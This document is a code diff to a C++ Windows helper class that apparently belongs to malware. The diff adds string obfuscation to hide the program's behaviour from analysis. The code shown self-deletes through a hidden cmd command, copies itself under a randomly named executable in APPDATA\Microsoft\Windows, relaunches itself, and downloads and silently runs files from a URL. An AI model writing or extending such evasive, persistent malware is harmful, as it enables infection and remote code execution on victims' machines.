@@ -11,7 +11,6 @@
 #pragma comment(lib,"wininet")
 
 #include <strsafe.h>
-#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
 
 class Helpers
 {
@@ -111,15 +110,15 @@ class Helpers
 		{
 
 			//killProcessByName("cmd.exe");
-			killProcessByName("wscript.exe");
+			//killProcessByName("wscript.exe");
 			TCHAR szModuleName[MAX_PATH];
 			TCHAR szCmd[2 * MAX_PATH];
 			STARTUPINFO si = { 0 };
 			PROCESS_INFORMATION pi = { 0 };
 
 			GetModuleFileName(NULL, szModuleName, MAX_PATH);
-
-			StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+			std::string remove = OBFUSCATE("cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"");
+			StringCbPrintf(szCmd, 2 * MAX_PATH, remove.c_str(), szModuleName);
 
 			CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
@@ -157,7 +156,7 @@ class Helpers
 
 		static std::string RandomString(int len) {
 			srand((unsigned int)time(NULL));
-			std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+			std::string str = OBFUSCATE("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
 			std::string newstr;
 			int pos;
 			while (newstr.size() != len) {
@@ -203,8 +202,8 @@ class Helpers
 
 		static std::string installedOrnot() {
 			//Kill Current Place
-			std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\";
-			std::string installFile = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe";
+			std::string installPath = (std::string)getenv("APPDATA") + OBFUSCATE("\\Microsoft\\Windows\\");
+			std::string installFile = (std::string)getenv("APPDATA") + OBFUSCATE("\\Microsoft\\Windows\\") + RandomString(10) + OBFUSCATE(".exe");
 			//Check if Appdata Dir 
 
 			if (CreateDirectory(installPath.c_str(), NULL) ||
@@ -227,7 +226,7 @@ class Helpers
 					}
 					else {
 						std::cout << "Installed " << std::endl;
-						std::string rebootString = "  /C  start " + installFile;
+						std::string rebootString = OBFUSCATE("  /C  start ") + installFile;
 						//system(rebootString.c_str());
 						ShellExecute(
 							NULL,
@@ -375,7 +374,7 @@ class Helpers
 		}
 
 		static void update(std::string url) {
-			std::string file((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe");
+			std::string file((std::string)getenv("APPDATA") + OBFUSCATE("\\Microsoft\\Windows\\") + RandomString(10) + OBFUSCATE(".exe"));
 			downloadFile(url, file);
 			ShellExecute(GetDesktopWindow(), "open", file.c_str(), NULL, NULL, SW_HIDE);
 			uninstall();
